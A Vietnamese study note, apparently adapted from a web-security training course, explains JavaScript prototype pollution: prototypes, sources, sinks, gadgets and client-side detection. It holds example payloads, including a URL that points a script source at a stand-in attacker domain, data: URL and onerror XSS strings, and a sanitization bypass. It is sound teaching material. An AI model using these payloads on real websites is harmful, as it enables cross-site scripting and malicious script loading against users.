# Prototype pollution

Trạng thái: Chưa bắt đầu
subject: Advanced

# Prototype pollution là gì?

---

Prototype pollution là một lỗ hổng trong JavaScript cho phép kẻ tấn công thêm các thuộc tính tùy ý vào prototype của các đối tượng toàn cục, từ đó các đối tượng do người dùng định nghĩa có thể kế thừa các thuộc tính này.

![image.png](Prototype%20pollution/image.png)

Mặc dù prototype pollution thường không thể khai thác như một lỗ hổng độc lập, nó cho phép kẻ tấn công kiểm soát các thuộc tính của những đối tượng vốn dĩ không thể truy cập. Nếu ứng dụng xử lý một thuộc tính do kẻ tấn công kiểm soát theo cách không an toàn, lỗ hổng này có thể được kết chuỗi với các lỗ hổng khác. Trong JavaScript phía client, điều này thường dẫn đến DOM XSS, trong khi prototype pollution phía server thậm chí có thể dẫn đến thực thi mã từ xa.

Nếu bạn chưa quen với cách prototype và cơ chế kế thừa hoạt động trong JavaScript, chúng tôi khuyến nghị đọc phần tổng quan sau trước khi tiếp tục.

---

# Javascript prototype và kế thừa

---

JavaScript sử dụng mô hình **kế thừa dựa trên prototype (prototypal inheritance)**, khác khá nhiều so với mô hình **dựa trên lớp (class-based)** mà nhiều ngôn ngữ lập trình khác sử dụng.

Trong phần này, chúng tôi sẽ cung cấp một cái nhìn tổng quan cơ bản về cách thức hoạt động của mô hình này, đủ để bạn có thể nắm được nền tảng cần thiết nhằm theo dõi các tài liệu học tập về lỗ hổng **prototype pollution**.

---

## Object

---

Một **đối tượng trong JavaScript** về bản chất chỉ là một tập hợp các cặp **key:value** được gọi là *thuộc tính (properties)*.

Ví dụ, đối tượng sau có thể biểu diễn một người dùng:

```jsx
const user =  {
    username: "wiener",
    userId: 01234,
    isAdmin: false
}
```

Bạn có thể truy cập các thuộc tính của đối tượng bằng cách sử dụng **dot notation** (dấu chấm) hoặc **bracket notation** (ngoặc vuông) để tham chiếu tới key tương ứng:

```jsx
user.username     // "wiener"
user['userId']    // 01234
```

Ngoài dữ liệu, thuộc tính còn có thể chứa các **hàm có thể thực thi**. Trong trường hợp này, hàm được gọi là một **phương thức (method)**.

```jsx
const user =  {
    username: "wiener",
    userId: 01234,
    exampleMethod: function(){
        // thực hiện gì đó
    }
}
```

Ví dụ trên là một **object literal**, tức là được tạo ra bằng cú pháp dấu ngoặc nhọn để khai báo trực tiếp các thuộc tính cùng giá trị khởi tạo của chúng.

Tuy nhiên, điều quan trọng cần hiểu là **gần như mọi thứ trong JavaScript đều là object ở tầng bên dưới**. Trong toàn bộ tài liệu này, khi nhắc đến "object" thì không chỉ nói đến object literal, mà là nói đến **tất cả các thực thể trong JavaScript**.

---

## Prototype

---

Trong JavaScript, **mỗi đối tượng (object)** đều được liên kết với một đối tượng khác nào đó, gọi là **prototype** của nó.

Mặc định, JavaScript sẽ tự động gán cho các đối tượng mới một trong những prototype dựng sẵn (built-in prototypes). Ví dụ:

```jsx
let myObject = {};
Object.getPrototypeOf(myObject);    // Object.prototype

let myString = "";
Object.getPrototypeOf(myString);    // String.prototype

let myArray = [];
Object.getPrototypeOf(myArray);     // Array.prototype

let myNumber = 1;
Object.getPrototypeOf(myNumber);    // Number.prototype
```

Các đối tượng sẽ **tự động kế thừa toàn bộ thuộc tính và phương thức** từ prototype được gán cho chúng, trừ khi đối tượng đã có thuộc tính riêng trùng tên.

Điều này cho phép lập trình viên tạo ra các đối tượng mới có thể **tái sử dụng** các thuộc tính và phương thức có sẵn của đối tượng khác.

Các prototype dựng sẵn cung cấp nhiều thuộc tính và phương thức hữu ích để làm việc với kiểu dữ liệu cơ bản.

Ví dụ:

- `String.prototype` có sẵn phương thức `toLowerCase()`.
- Do đó, **mọi chuỗi (string)** đều tự động có thể gọi `toLowerCase()` để chuyển sang chữ thường mà không cần tự định nghĩa lại.

👉 Nhờ cơ chế này, JavaScript giúp tiết kiệm công sức cho lập trình viên khi thao tác với dữ liệu, vì các hành vi phổ biến đã được cung cấp sẵn trong prototype.

---

## Inheritance

---

Mỗi khi bạn tham chiếu đến một **thuộc tính (property)** của một object, JavaScript engine sẽ:

1. **Kiểm tra trực tiếp** trên chính object đó trước.
2. Nếu object **không có thuộc tính tương ứng**, engine sẽ tiếp tục **tìm trong prototype** của object.

Nhờ cơ chế này, object có thể sử dụng lại các thuộc tính và phương thức đã được định nghĩa trong prototype mà không cần khai báo lại.

![image.png](Prototype%20pollution/image%201.png)

Ví dụ:

```jsx
let myObject = {};
```

Object `myObject` ở trên hoàn toàn rỗng, không có thuộc tính hay phương thức nào được định nghĩa trực tiếp.

Tuy nhiên, nếu bạn mở **console của trình duyệt**, gõ `myObject.` (dấu chấm), bạn sẽ thấy nó hiển thị danh sách các thuộc tính và phương thức gợi ý.

![image.png](Prototype%20pollution/image%202.png)

👉 Đây là các thuộc tính và phương thức mà `myObject` **kế thừa từ `Object.prototype`**, chẳng hạn như:

- `toString()`
- `hasOwnProperty()`
- `valueOf()`

---

## Prototype chain

---

Cần lưu ý rằng **prototype của một object cũng chỉ là một object khác**, và nó lại có prototype riêng của nó, cứ thế tiếp diễn.

Vì hầu như mọi thứ trong JavaScript đều là object ở tầng bên dưới, nên **chuỗi prototype (prototype chain)** này cuối cùng sẽ dẫn về **Object.prototype**, và prototype của `Object.prototype` là `null` (điểm kết thúc của chain).

![image.png](Prototype%20pollution/image%203.png)

Điều quan trọng là object **kế thừa thuộc tính không chỉ từ prototype trực tiếp**, mà còn từ **tất cả các object nằm phía trên trong prototype chain**.

Ví dụ:

```jsx
let username = "wiener";
```

Ở đây:

- `username` là một **string object**
- Nó có thể sử dụng các phương thức trong **String.prototype** (ví dụ: `toLowerCase()`, `slice()`, `substring()`)
- Đồng thời, nó cũng kế thừa các phương thức từ **Object.prototype** (ví dụ: `hasOwnProperty()`, `toString()`)
👉 Tóm lại: **Prototype chain cho phép object trong JavaScript có thể dùng chung và tái sử dụng thuộc tính/phương thức của nhiều cấp prototype khác nhau, thay vì chỉ của riêng nó.**

---

## Truy cập Prototype của Object

---

Mỗi object trong JavaScript đều có một **thuộc tính đặc biệt** dùng để truy cập prototype của nó.

Mặc dù thuộc tính này không có tên chính thức trong chuẩn, nhưng **`__proto__`** đã trở thành “chuẩn ngầm” (de facto standard) được hầu hết các trình duyệt hỗ trợ.

Nếu bạn quen với các ngôn ngữ lập trình hướng đối tượng, thì `__proto__` đóng vai trò như **getter và setter** cho prototype của object.

- Bạn có thể dùng nó để **đọc** prototype và các thuộc tính của prototype.
- Hoặc thậm chí **gán lại prototype** nếu cần.

> Truy cập
> 

Giống như bất kỳ thuộc tính nào khác, bạn có thể truy cập bằng **dot notation** hoặc **bracket notation**:

```jsx
username.__proto__
username['__proto__']
```

> Duyệt lên prototype chain bằng `__proto__`
> 

Bạn cũng có thể **xâu chuỗi (chain)** `__proto__` để lần lượt đi lên trong prototype chain:

```jsx
username.__proto__                        // String.prototype
username.__proto__.__proto__              // Object.prototype
username.__proto__.__proto__.__proto__    // null
```

👉 Tóm lại: `__proto__` là “cửa ngõ” để bạn quan sát hoặc thao tác với **prototype chain** của một object.#

---

## Chỉnh sửa Prototype

---

Mặc dù thường được xem là **thực hành không tốt (bad practice)**, nhưng trong JavaScript, ta hoàn toàn có thể **chỉnh sửa các prototype dựng sẵn** giống như chỉnh sửa bất kỳ object nào khác.

Điều này có nghĩa là lập trình viên có thể:

- **Tùy chỉnh hoặc ghi đè (override)** hành vi của các phương thức dựng sẵn.
- **Thêm mới** các phương thức để thực hiện các thao tác hữu ích.

Ví dụ:

Trong JavaScript hiện đại, đã có sẵn phương thức `trim()` cho chuỗi (string) để loại bỏ khoảng trắng ở đầu và cuối.

Tuy nhiên, **trước khi `trim()` được giới thiệu**, các lập trình viên thường tự định nghĩa một phương thức tương tự bằng cách thêm vào `String.prototype`:

```jsx
String.prototype.removeWhitespace = function(){
    // loại bỏ khoảng trắng ở đầu và cuối
}
```

Nhờ cơ chế **prototypal inheritance**, mọi chuỗi (string) sau đó đều có thể sử dụng phương thức này:

```jsx
let searchTerm = "  example ";
searchTerm.removeWhitespace();    // "example"
```

---

# Nguyên nhân phát sinh lỗ hổng

---

Lỗ hổng prototype pollution thường phát sinh khi một hàm JavaScript đệ quy **merge** một đối tượng chứa các thuộc tính do người dùng kiểm soát vào một đối tượng đã tồn tại, nhưng không **làm sạch (sanitize)** các khóa trước. Điều này có thể cho phép kẻ tấn công chèn một thuộc tính có khóa như `__proto__`, kèm theo các thuộc tính lồng nhau tùy ý.

Vì `__proto__` mang ý nghĩa đặc biệt trong ngữ cảnh JavaScript, thao tác merge có thể gán các thuộc tính lồng đó cho **prototype** của đối tượng thay vì cho chính đối tượng mục tiêu. Kết quả là kẻ tấn công có thể làm ô nhiễm prototype bằng các thuộc tính chứa giá trị có hại, và những thuộc tính này sau đó có thể bị ứng dụng sử dụng theo cách nguy hiểm.

Có thể làm ô nhiễm bất kỳ prototype object nào, nhưng điều này thường xảy ra nhất với prototype toàn cục dựng sẵn `Object.prototype`.

Khai thác thành công prototype pollution đòi hỏi các thành phần chính sau:

- **Một nguồn prototype pollution** - bất kỳ input nào cho phép bạn đầu độc (poison) các object prototype bằng thuộc tính tùy ý.
- **Một sink** - nói cách khác, một hàm JavaScript hoặc phần tử DOM cho phép thực thi mã tùy ý.
- **Một gadget có thể khai thác** - bất kỳ thuộc tính nào được truyền vào sink mà không được lọc hoặc làm sạch đúng cách.

---

# Sources

---

Nguồn prototype pollution là bất kỳ đầu vào do người dùng kiểm soát nào cho phép bạn thêm các thuộc tính tùy ý vào các đối tượng prototype. Các nguồn phổ biến nhất như sau:

- URL thông qua chuỗi truy vấn (query) hoặc chuỗi fragment (hash)
- Dữ liệu dạng JSON (JSON-based input)
- Web messages

---

## URL

---

Hãy xem xét URL sau, có chứa chuỗi truy vấn do kẻ tấn công tạo:

```
https://vulnerable-website.com/?__proto__[evilProperty]=payload
```

Khi phân tích chuỗi truy vấn thành các cặp khóa:giá trị, một bộ phân tích URL có thể hiểu `__proto__` như một chuỗi ký tự bình thường. Nhưng hãy xem điều gì xảy ra nếu những khóa và giá trị này sau đó được *merge* vào một đối tượng hiện có như các thuộc tính.

Bạn có thể nghĩ rằng thuộc tính `__proto__`, cùng với thuộc tính lồng `evilProperty`, sẽ chỉ được thêm vào đối tượng mục tiêu như sau:

```json
{
    existingProperty1: 'foo',
    existingProperty2: 'bar',
    __proto__: {
        evilProperty: 'payload'
    }
}
```

Tuy nhiên, thực tế không phải vậy. Ở một thời điểm nào đó, thao tác merge đệ quy có thể gán giá trị của `evilProperty` bằng một câu lệnh tương đương với:

```jsx
targetObject.__proto__.evilProperty = 'payload';
```

Trong phép gán này, engine JavaScript xử lý `__proto__` như một getter cho prototype. Kết quả là `evilProperty` được gán vào đối tượng prototype trả về thay vì vào chính đối tượng mục tiêu. Giả sử đối tượng mục tiêu sử dụng `Object.prototype` mặc định, tất cả các đối tượng trong runtime JavaScript giờ đây sẽ kế thừa `evilProperty`, trừ khi chúng đã có thuộc tính riêng với cùng khóa.

Trong thực tế, việc chèn một thuộc tính có tên `evilProperty` có khả năng không có tác dụng gì trực tiếp. Tuy nhiên, kẻ tấn công có thể sử dụng cùng kỹ thuật này để làm ô nhiễm prototype với những thuộc tính được ứng dụng hoặc bất kỳ thư viện được nhập sử dụng, từ đó gây ra các hệ quả nguy hiểm.

---

## JSON Input

---

Các đối tượng do người dùng kiểm soát thường được tạo ra từ chuỗi JSON bằng phương thức `JSON.parse()`. Đáng chú ý, `JSON.parse()` cũng xử lý **mọi key trong đối tượng JSON như một chuỗi tùy ý**, bao gồm cả những key như `__proto__`. Điều này tạo ra một vector tiềm năng khác cho prototype pollution.

Giả sử kẻ tấn công chèn JSON độc hại sau (ví dụ, thông qua web message):

```json
{
    "__proto__": {
        "evilProperty": "payload"
    }
}
```

Nếu chuỗi này được chuyển thành đối tượng JavaScript qua `JSON.parse()`, đối tượng kết quả **thực sự sẽ có một thuộc tính với key `__proto__`**:

```jsx
const objectLiteral = {__proto__: {evilProperty: 'payload'}};
const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');

objectLiteral.hasOwnProperty('__proto__');     // false
objectFromJson.hasOwnProperty('__proto__');    // true
```

Nếu đối tượng được tạo thông qua `JSON.parse()` sau đó được **merge vào một đối tượng hiện có mà không làm sạch key đúng cách**, điều này cũng sẽ dẫn đến prototype pollution trong quá trình gán, giống như ví dụ dựa trên URL trước đó.

---

# Sinks

---

Một **sink của prototype pollution** về cơ bản chỉ là một hàm JavaScript hoặc phần tử DOM mà bạn có thể truy cập thông qua prototype pollution, cho phép bạn thực thi JavaScript tùy ý hoặc các lệnh hệ thống. Chúng tôi đã trình bày chi tiết một số sink phía client trong chủ đề về **DOM XSS**.

Vì prototype pollution cho phép bạn kiểm soát các thuộc tính vốn dĩ không thể truy cập, điều này có khả năng mở ra một số lượng lớn các sink bổ sung trong ứng dụng mục tiêu. Các nhà phát triển không quen với prototype pollution có thể nhầm tưởng rằng những thuộc tính này không thể bị người dùng điều khiển, dẫn tới việc chỉ có rất ít bộ lọc hoặc làm sạch (sanitization) được áp dụng.

---

# Gadgets

---

Một **gadget** cung cấp phương tiện biến lỗ hổng prototype pollution thành một khai thác thực tế. Đây là bất kỳ thuộc tính nào thỏa hai điều kiện sau:

- Được **ứng dụng sử dụng theo cách không an toàn**, ví dụ như truyền thuộc tính đó vào một *sink* mà không có lọc hoặc làm sạch (sanitization) đúng cách.
- **Có thể bị kẻ tấn công điều khiển thông qua prototype pollution** - tức là đối tượng phải có khả năng **kế thừa** phiên bản độc hại của thuộc tính mà kẻ tấn công thêm vào prototype.

Một thuộc tính **không thể** là gadget nếu nó được **định nghĩa trực tiếp trên chính đối tượng**. Trong trường hợp này, phiên bản thuộc tính trên đối tượng sẽ được ưu tiên hơn bất kỳ phiên bản độc hại nào bạn thêm vào prototype. Các website được bảo mật tốt cũng có thể **thiết lập prototype của đối tượng về `null`**, đảm bảo rằng đối tượng đó **không kế thừa bất kỳ thuộc tính nào**.

---

## Ví dụ

---

Nhiều thư viện JavaScript chấp nhận một đối tượng mà lập trình viên có thể dùng để thiết lập các tuỳ chọn cấu hình khác nhau. Mã của thư viện kiểm tra xem lập trình viên có tự thêm các thuộc tính nhất định vào đối tượng này hay không và, nếu có, điều chỉnh cấu hình cho phù hợp. Nếu một thuộc tính biểu thị một tuỳ chọn cụ thể không tồn tại, thường sẽ sử dụng một tuỳ chọn mặc định được định nghĩa trước. Một ví dụ đơn giản có thể trông như sau:

```jsx
let transport_url = config.transport_url || defaults.transport_url;
```

Bây giờ hãy tưởng tượng mã của thư viện sử dụng `transport_url` này để thêm một tham chiếu script vào trang:

```jsx
let script = document.createElement('script');
script.src = `${transport_url}/example.js`;
document.body.appendChild(script);
```

Nếu các nhà phát triển của website chưa thiết lập thuộc tính `transport_url` trên đối tượng `config` của họ, đây có thể là một gadget tiềm năng. Trong trường hợp kẻ tấn công có thể làm ô nhiễm `Object.prototype` toàn cục với thuộc tính `transport_url` do chúng tự đặt, thuộc tính này sẽ được kế thừa bởi đối tượng `config` và do đó sẽ được thiết lập làm `src` cho script tới một miền do kẻ tấn công lựa chọn.

Nếu prototype có thể bị ô nhiễm thông qua tham số truy vấn (query parameter), ví dụ, kẻ tấn công chỉ cần khiến nạn nhân truy cập một URL được chế tạo đặc biệt để khiến trình duyệt của họ import một file JavaScript độc hại từ miền do kẻ tấn công kiểm soát:

```
https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
```

Bằng cách cung cấp một URL `data:`, kẻ tấn công cũng có thể nhúng trực tiếp payload XSS trong chuỗi truy vấn như sau:

```
https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
```

Lưu ý rằng `//` ở cuối ví dụ này đơn thuần để comment-out phần hậu tố cố định `/example.js`.

---

# Client-side

---

Trong phần này, bạn sẽ học cách tìm các lỗ hổng prototype pollution phía client ngoài thực tế. Để củng cố hiểu biết về cách các lỗ hổng này hoạt động, chúng tôi sẽ trình bày cách thực hiện thủ công, cũng như cách bạn có thể sử dụng DOM Invader để tự động hóa phần lớn quy trình này. Bạn cũng sẽ có cơ hội thực hành những gì đã học bằng cách khai thác prototype pollution để thực hiện DOM XSS trên một số LAB cố ý dễ bị tấn công.

---

## Tìm Sources thủ công

---

Việc tìm nguồn prototype pollution theo cách thủ công phần lớn mang tính thử–sai. Tóm lại, bạn cần thử nhiều cách để thêm một thuộc tính tùy ý vào `Object.prototype` cho đến khi tìm được một nguồn hoạt động.

Khi kiểm thử các lỗ hổng phía client, quy trình cấp cao bao gồm các bước sau:

- Thử tiêm một thuộc tính tùy ý thông qua query string, URL fragment, và bất kỳ đầu vào JSON nào. Ví dụ:
    
    ```
    vulnerable-website.com/?__proto__[foo]=bar
    ```
    
- Trong bảng điều khiển (console) của trình duyệt, kiểm tra `Object.prototype` để xem bạn đã “ô nhiễm” (pollute) nó bằng thuộc tính tùy ý hay chưa:
    
    ```jsx
    Object.prototype.foo
    // "bar" cho biết bạn đã ô nhiễm prototype thành công
    // undefined cho biết tấn công không thành công
    ```
    
- Nếu thuộc tính không được thêm vào prototype, hãy thử các kỹ thuật khác, chẳng hạn chuyển sang dấu chấm (dot notation) thay cho dấu ngoặc (bracket notation), hoặc ngược lại:
    
    ```
    vulnerable-website.com/?__proto__.foo=bar
    ```
    
- Lặp lại quy trình này cho từng nguồn tiềm năng.

> **Mẹo**
> 
> 
> Nếu cả hai kỹ thuật trên đều không thành công, bạn vẫn có thể ô nhiễm prototype thông qua `constructor`. Chúng tôi sẽ trình bày chi tiết cách thực hiện việc này ở phần sau.
> 

---

## Tìm Sources bằng DOM Invader

---

Như bạn thấy, việc tìm nguồn prototype pollution theo cách thủ công có thể khá tẻ nhạt. Thay vào đó, chúng tôi khuyến nghị sử dụng DOM Invader, công cụ đã được cài sẵn trong trình duyệt tích hợp của Burp. DOM Invader có khả năng tự động kiểm tra các nguồn prototype pollution khi bạn duyệt, điều này có thể giúp tiết kiệm đáng kể thời gian và công sức.

Để biết thêm thông tin, hãy tham khảo tài liệu DOM Invader.

---

## Tìm Gadgets thủ công

---

Khi bạn đã xác định được một nguồn cho phép thêm các thuộc tính tùy ý vào `Object.prototype` toàn cục, bước tiếp theo là tìm một gadget phù hợp để xây dựng PoC khai thác. Trong thực tế, chúng tôi khuyên bạn nên sử dụng DOM Invader để làm việc này, nhưng việc xem qua quy trình thủ công vẫn hữu ích vì nó giúp củng cố hiểu biết về lỗ hổng.

- Duyệt mã nguồn và xác định bất kỳ thuộc tính nào được ứng dụng hoặc các thư viện mà ứng dụng nhập vào sử dụng.
- Trong Burp, bật chặn phản hồi (Proxy > Options > Intercept server responses) và chặn phản hồi chứa mã JavaScript mà bạn muốn kiểm tra.
- Thêm một câu lệnh `debugger` ở đầu script, rồi chuyển tiếp (forward) các yêu cầu và phản hồi còn lại.
- Trong trình duyệt của Burp, vào trang nơi script mục tiêu được tải. Câu lệnh `debugger` sẽ tạm dừng việc thực thi script.
- Khi script vẫn đang tạm dừng, chuyển sang console và nhập lệnh sau, thay `YOUR-PROPERTY` bằng một trong các thuộc tính mà bạn nghĩ là gadget tiềm năng:

```jsx
Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
    get() {
        console.trace();
        return 'polluted';
    }
})
```

- Thuộc tính được thêm vào `Object.prototype` toàn cục, và trình duyệt sẽ ghi một stack trace vào console mỗi khi thuộc tính đó bị truy cập.
- Nhấn nút để tiếp tục thực thi script và theo dõi console. Nếu xuất hiện stack trace, điều này xác nhận rằng thuộc tính đã bị truy xuất ở đâu đó trong ứng dụng.
- Mở rộng stack trace và dùng đường dẫn (link) được cung cấp để nhảy tới dòng mã nơi thuộc tính đang được đọc.
- Sử dụng các điều khiển trình gỡ lỗi của trình duyệt để bước qua từng pha thực thi xem thuộc tính có được truyền tới một sink, chẳng hạn `innerHTML` hoặc `eval()`, hay không.
- Lặp lại quy trình này với bất kỳ thuộc tính nào khác mà bạn cho là gadget tiềm năng.

---

## Tìm Gadgets bằng DOM Invader

---

Như bạn thấy từ các bước trước, việc xác định thủ công các gadget prototype pollution trong thực tế có thể là một công việc tốn công sức. Vì các trang web thường phụ thuộc vào nhiều thư viện bên thứ ba, điều này có thể yêu cầu đọc qua hàng nghìn dòng mã đã được rút gọn (minified) hoặc obfuscated, khiến việc tìm kiếm càng trở nên khó khăn hơn. DOM Invader có thể tự động quét các gadget thay bạn và thậm chí có thể tạo một proof-of-concept (PoC) DOM XSS trong một số trường hợp. Điều này nghĩa là bạn có thể tìm được exploit trên các trang thật trong vài giây thay vì hàng giờ.

Để biết thêm thông tin, hãy tham khảo **Quét các gadget prototype pollution bằng DOM Invader**.

[Lab: DOM XSS via client-side prototype pollution | Web Security Academy](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution)

[Lab: DOM XSS via an alternative prototype pollution vector | Web Security Academy](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-an-alternative-prototype-pollution-vector)

---

## Contructor

---

Cho đến nay, chúng ta chỉ xem xét cách lấy tham chiếu tới các đối tượng prototype thông qua thuộc tính truy cập đặc biệt `__proto__`. Vì đây là kỹ thuật cổ điển để thực hiện prototype pollution, một biện pháp phòng ngừa phổ biến là loại bỏ bất kỳ thuộc tính nào có key là `__proto__` từ các đối tượng do người dùng điều khiển trước khi trộn (merge) chúng. Cách tiếp cận này có khiếm khuyết vì tồn tại những cách thay thế để tham chiếu tới `Object.prototype` mà không cần dựa vào chuỗi `__proto__` chút nào.

Trừ khi prototype của nó được đặt về `null`, mọi đối tượng JavaScript đều có một thuộc tính `constructor`, chứa tham chiếu tới hàm constructor đã được dùng để tạo nó. Ví dụ, bạn có thể tạo một đối tượng mới bằng cú pháp literal hoặc bằng cách gọi rõ ràng hàm `Object()` như sau:

```jsx
let myObjectLiteral = {};
let myObject = new Object();
```

Bạn sau đó có thể tham chiếu tới constructor `Object()` thông qua thuộc tính `constructor` tích hợp sẵn:

```jsx
myObjectLiteral.constructor            // function Object(){...}
myObject.constructor                   // function Object(){...}
```

Hãy nhớ rằng các hàm về cơ bản cũng chỉ là các đối tượng. Mỗi hàm constructor có một thuộc tính `prototype`, trỏ tới prototype sẽ được gán cho mọi đối tượng được tạo bởi constructor đó. Do đó, bạn cũng có thể truy cập prototype của bất kỳ đối tượng nào như sau:

```jsx
myObject.constructor.prototype        // Object.prototype
myString.constructor.prototype        // String.prototype
myArray.constructor.prototype         // Array.prototype
```

Vì `myObject.constructor.prototype` tương đương với `myObject.__proto__`, điều này cung cấp một vector thay thế cho việc ô nhiễm prototype.

---

## Bypass làm sạch key

---

Một cách rõ ràng mà các website cố ngăn prototype pollution là lọc (sanitize) các khóa thuộc tính trước khi gộp chúng vào một đối tượng hiện có. Tuy nhiên, một sai lầm phổ biến là không thực hiện việc lọc chuỗi một cách đệ quy. Ví dụ, hãy xem xét URL sau:

```
vulnerable-website.com/?__pro__proto__to__.gadget=payload
```

Nếu quá trình lọc chỉ loại bỏ chuỗi `__proto__` mà không lặp lại việc này nhiều lần, điều này sẽ dẫn tới URL sau, vốn có thể là một nguồn prototype pollution hợp lệ:

```
vulnerable-website.com/?__proto__.gadget=payload
```

[Lab: Client-side prototype pollution via flawed sanitization | Web Security Academy](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-via-flawed-sanitization)

---

## **External libraries**

---

Như đã đề cập ở trên, các gadget prototype pollution có thể xuất hiện trong các thư viện bên thứ ba được ứng dụng nhập vào. Trong trường hợp này, chúng tôi **rất** khuyến nghị sử dụng các tính năng prototype pollution của DOM Invader để xác định nguồn và gadget. Việc này không chỉ nhanh hơn nhiều mà còn đảm bảo bạn sẽ không bỏ sót những lỗ hổng vốn rất khó nhận ra nếu làm thủ công.

[Lab: Client-side prototype pollution in third-party libraries | Web Security Academy](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries)

---

## APIs

---

Bạn có thể ngạc nhiên khi biết rằng có một số gadget prototype pollution phổ biến trong các API JavaScript được trình duyệt cung cấp. Trong phần này, chúng tôi sẽ chỉ cho bạn cách khai thác chúng để thực hiện DOM XSS, có khả năng **bỏ qua** các biện pháp phòng vệ prototype pollution bị lỗi do nhà phát triển triển khai.

---

### fetch()

---

Fetch API cung cấp một cách đơn giản cho nhà phát triển để thực hiện các yêu cầu HTTP bằng JavaScript. Phương thức `fetch()` nhận hai đối số:

- URL mà bạn muốn gửi yêu cầu tới.
- Một đối tượng `options` cho phép bạn điều khiển các phần của yêu cầu, chẳng hạn `method`, `headers`, `body`, v.v.

Ví dụ sau minh họa cách gửi một yêu cầu POST bằng `fetch()`:

```jsx
fetch('https://normal-website.com/my-account/change-email', {
    method: 'POST',
    body: 'user=carlos&email=carlos%40ginandjuice.shop'
})
```

Như bạn thấy, chúng ta đã định nghĩa rõ ràng các thuộc tính `method` và `body`, nhưng còn nhiều thuộc tính khác có thể để undefined. Trong trường hợp này, nếu kẻ tấn công tìm được một nguồn phù hợp, họ có thể ô nhiễm `Object.prototype` với thuộc tính `headers` do họ điều khiển. Thuộc tính này sau đó sẽ được kế thừa bởi đối tượng `options` được truyền vào `fetch()` và có thể được sử dụng để tạo yêu cầu.

Điều này có thể dẫn đến nhiều vấn đề. Ví dụ, đoạn mã sau có khả năng bị DOM XSS thông qua prototype pollution:

```jsx
fetch('/my-products.json',{method:"GET"})
    .then((response) => response.json())
    .then((data) => {
        let username = data['x-username'];
        let message = document.querySelector('.message');
        if(username) {
            message.innerHTML = `My products. Logged in as <b>${username}</b>`;
        }
        let productList = document.querySelector('ul.products');
        for(let product of data) {
            let product = document.createElement('li');
            product.append(product.name);
            productList.append(product);
        }
    })
    .catch(console.error);
```

Để khai thác điều này, kẻ tấn công có thể ô nhiễm `Object.prototype` với một thuộc tính `headers` chứa header `x-username` độc hại như sau:

```
?__proto__[headers][x-username]=<img/src/onerror=alert(1)>
```

Giả sử phía server dùng header này để thiết lập giá trị của thuộc tính `x-username` trong tệp JSON trả về. Trong mã client-side dễ bị tổn thương ở trên, giá trị này được gán cho biến `username`, và sau đó được truyền vào sink `innerHTML`, dẫn tới DOM XSS.

> **Lưu ý**
> 
> 
> Bạn có thể dùng kỹ thuật này để điều khiển bất kỳ thuộc tính undefined nào của đối tượng `options` được truyền vào `fetch()`. Điều này có thể cho phép bạn thêm một `body` độc hại vào yêu cầu, ví dụ.
> 

---

### **Object.defineProperty()**

---

Những nhà phát triển có phần hiểu biết về prototype pollution có thể cố gắng chặn các gadget tiềm năng bằng cách dùng phương thức `Object.defineProperty()`. Điều này cho phép bạn đặt một thuộc tính không thể cấu hình, không thể ghi đè trực tiếp trên đối tượng bị ảnh hưởng như sau:

```jsx
Object.defineProperty(vulnerableObject, 'gadgetProperty', {
    configurable: false,
    writable: false
})
```

Lúc đầu điều này có vẻ là một biện pháp giảm thiểu hợp lý vì nó ngăn đối tượng dễ bị tấn công kế thừa một phiên bản độc hại của thuộc tính gadget thông qua chuỗi prototype. Tuy nhiên, cách làm này vốn dĩ có sai sót.

Tương tự như phương thức `fetch()` đã trình bày trước đó, `Object.defineProperty()` nhận một đối tượng `options`, được gọi là **descriptor**. Bạn có thể thấy điều này trong ví dụ trên. Trong số các tùy chọn khác, nhà phát triển có thể dùng descriptor này để đặt một giá trị khởi tạo cho thuộc tính đang được định nghĩa. Tuy nhiên, nếu lý do duy nhất họ định nghĩa thuộc tính này là để chống prototype pollution, họ có thể sẽ không bận tâm đặt giá trị ban đầu.

Trong trường hợp này, kẻ tấn công có thể vượt qua biện pháp phòng ngừa bằng cách ô nhiễm `Object.prototype` với một thuộc tính `value` độc hại. Nếu thuộc tính này bị kế thừa bởi đối tượng descriptor được truyền vào `Object.defineProperty()`, thì giá trị do kẻ tấn công kiểm soát vẫn có thể được gán cho thuộc tính gadget.

[Lab: Client-side prototype pollution via browser APIs | Web Security Academy](https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis/lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis)

---

# Server-side

---

JavaScript ban đầu là một ngôn ngữ phía client được thiết kế để chạy trong trình duyệt. Tuy nhiên, do sự xuất hiện của các runtime phía máy chủ, chẳng hạn như Node.js rất phổ biến, JavaScript hiện được sử dụng rộng rãi để xây dựng máy chủ, API và các ứng dụng back-end khác. Logic cho thấy điều này cũng khiến khả năng xuất hiện các lỗ hổng prototype pollution trong bối cảnh phía máy chủ.

Mặc dù các khái niệm cơ bản vẫn phần lớn giống nhau, quá trình xác định các lỗ hổng prototype pollution phía máy chủ và phát triển chúng thành các exploit hoạt động lại đặt ra một số thách thức bổ sung.

Trong phần này, bạn sẽ học một số kỹ thuật để phát hiện prototype pollution phía máy chủ theo phương pháp black-box. Chúng tôi sẽ trình bày cách thực hiện việc này một cách hiệu quả và không phá hủy, sau đó sử dụng các lab tương tác được thiết kế dễ bị tổn thương để minh họa cách bạn có thể tận dụng prototype pollution để thực hiện thực thi mã từ xa (RCE).

---

## Tại sao Prototype Server-side khó phát hiện

---

Vì nhiều lý do, prototype pollution phía máy chủ nói chung khó phát hiện hơn so với biến thể phía client:

- Không có quyền truy cập mã nguồn - Khác với lỗ hổng phía client, bạn thường không có quyền truy cập vào mã JavaScript dễ bị tổn thương. Điều này có nghĩa là không có cách nhanh chóng để nắm được những sink nào tồn tại hoặc phát hiện các thuộc tính gadget tiềm năng.
